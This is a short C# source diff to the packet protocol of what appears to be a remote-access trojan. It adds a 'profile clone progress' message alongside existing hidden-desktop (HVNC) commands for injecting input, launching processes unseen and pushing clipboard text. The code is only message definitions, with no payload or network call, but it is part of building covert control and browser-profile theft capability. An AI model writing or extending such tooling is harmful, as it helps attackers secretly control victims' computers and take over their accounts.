@@ -55,6 +55,7 @@ public enum PacketType
     HvncInput     = 104,  // server→client: {T, X, Y, Button, Down, WheelDelta, VK}
     HvncExec      = 105,  // server→client: {Path} — launch process on hidden desktop
     HvncClipboard = 106,  // server→client: {Text} — push text to hidden desktop clipboard
+    HvncProgress  = 107,  // client→server: {Pct, Label} — profile clone progress
 
     // TCP Manager
     TcpGetList    = 110,  // server→client: request TCP connection list
@@ -358,6 +359,12 @@ public class HvncExecData
 public class HvncClipboardData
 {
     public string Text { get; set; } = string.Empty;
+}
+
+public class HvncProgressData
+{
+    public int    Pct   { get; set; }
+    public string Label { get; set; } = string.Empty;
 }
 
 // ── TCP Manager ──────────────────────────────────────
